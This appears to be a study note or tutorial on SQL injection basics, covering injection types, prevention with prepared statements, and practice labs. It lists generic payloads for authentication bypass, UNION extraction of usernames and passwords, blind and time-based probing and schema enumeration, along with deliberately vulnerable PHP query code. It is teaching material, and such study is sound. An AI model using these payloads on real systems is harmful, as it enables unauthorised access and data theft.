Date : 13-05-2026

# Topic - SQLi Basics
SQL Injection (SQLi) Basics

What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database.

Attackers can:
- Bypass authentication
- Read sensitive data
- Modify database contents
- Delete data
- Execute administrative operations

What is SQL Injection?

SQL Injection happens when user input is inserted into SQL queries without proper validation or sanitization.

Example vulnerable query:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '1234';
```

Example vulnerable PHP code:

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Basic SQLi Example

Normal Input

```text
Username: admin
Password: 1234
```

Generated query:

```sql
SELECT * FROM users WHERE username='admin' AND password='1234';
```

Malicious Input

```text
Username: admin' --
Password: anything
```

Generated query:

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='anything';
```

`--` comments out the remaining query and bypasses authentication.

Common SQLi Payloads

Authentication bypass payload:

```sql
' OR '1'='1
```

Example:

```sql
SELECT * FROM users WHERE username='' OR '1'='1';
```

The condition always evaluates to TRUE.

SQL Comment Syntax

| Database | Comment Syntax |
|---|---|
| MySQL | `-- ` or `#` |
| PostgreSQL | `-- ` |
| MSSQL | `-- ` |
| Oracle | `-- ` |

Types of SQL Injection

1. In-Band SQLi

The attacker receives data directly in the response.

Error-Based SQLi:
Uses database error messages to extract information.

Union-Based SQLi:

```sql
' UNION SELECT username,password FROM users --
```

2. Blind SQLi

No visible output is returned.

Boolean-Based:

```sql
' AND 1=1 --
' AND 1=2 --
```

Time-Based:

```sql
' OR SLEEP(5) --
```

3. Out-of-Band SQLi

Uses external channels such as DNS or HTTP requests.

UNION Attack Basics

`UNION` combines results from multiple queries.

Example:

```sql
SELECT name FROM products
UNION
SELECT username FROM users;
```

Requirements:
- Same number of columns
- Compatible data types

Finding Number of Columns

ORDER BY Method

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

UNION NULL Method

```sql
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
```

Increase NULL values until the query works.

Database Enumeration

Current Database

MySQL:

```sql
SELECT database();
```

PostgreSQL:

```sql
SELECT current_database();
```

Enumerating Tables

```sql
SELECT table_name FROM information_schema.tables;
```

Enumerating Columns

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name='users';
```

Common DBMS Functions

| DBMS | Version Function |
|---|---|
| MySQL | `version()` |
| PostgreSQL | `version()` |
| MSSQL | `@@version` |
| Oracle | `banner` from `v$version` |

Error-Based SQLi Example

```sql
' AND extractvalue(1,concat(0x7e,(SELECT database()))) --
```

Blind SQLi Example

```sql
' AND SUBSTRING((SELECT database()),1,1)='a' --
```

Time-Based SQLi

MySQL:

```sql
' AND SLEEP(5) --
```

PostgreSQL:

```sql
' AND pg_sleep(5) --
```

Second-Order SQLi

The payload is stored first and executed later.

Example:
- Malicious username stored in the database
- Triggered later during processing

SQLi Prevention

Prepared Statements

PHP PDO Example:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

Parameterized Query in Python:

```python
cursor.execute(
    "SELECT * FROM users WHERE username=%s",
    (username,)
)
```

Input Validation:
- Allow only expected characters
- Reject dangerous input

Least Privilege:
- Use minimum database permissions
- Avoid using root/admin database accounts

Web Application Firewall (WAF):
- Detects and blocks common SQLi payloads

Examples:
- ModSecurity
- Cloudflare WAF

Dangerous Practices

Unsafe string concatenation:

```php
$query = "SELECT * FROM users WHERE id=".$id;
```

Avoid:
- Dynamic SQL without sanitization
- Excessive database privileges

SQLi Testing Tips

Characters commonly tested:

```text
'
"
`
)
```

Check for:
- SQL syntax errors
- Database error messages
- Delayed responses

Useful SQLi Payloads

Authentication bypass:

```sql
' OR 1=1 --
```

Find columns:

```sql
' ORDER BY 1 --
```

UNION injection:

```sql
' UNION SELECT NULL,NULL --
```

Version detection:

```sql
' UNION SELECT version(),NULL --
```

Time delay:

```sql
' AND SLEEP(5) --
```

Tools for Learning SQLi

| Tool | Purpose |
|---|---|
| sqlmap | Automated SQLi testing |
| Burp Suite | Web security testing |
| DVWA | Practice vulnerable app |
| PortSwigger Labs | Hands-on SQLi labs |

Legal and Ethical Note

Only test SQL Injection on:
- Systems you own
- Authorized lab environments
- CTFs and training platforms

Unauthorized testing is illegal.

Recommended Practice Labs

- PortSwigger Web Security Academy
- DVWA
- OWASP Juice Shop
- Hack The Box
- TryHackMe

Summary

SQL Injection occurs when user input is inserted into SQL queries unsafely.

Main categories:
- In-Band SQLi
- Blind SQLi
- Out-of-Band SQLi

Best defense:
- Prepared statements
- Parameterized queries
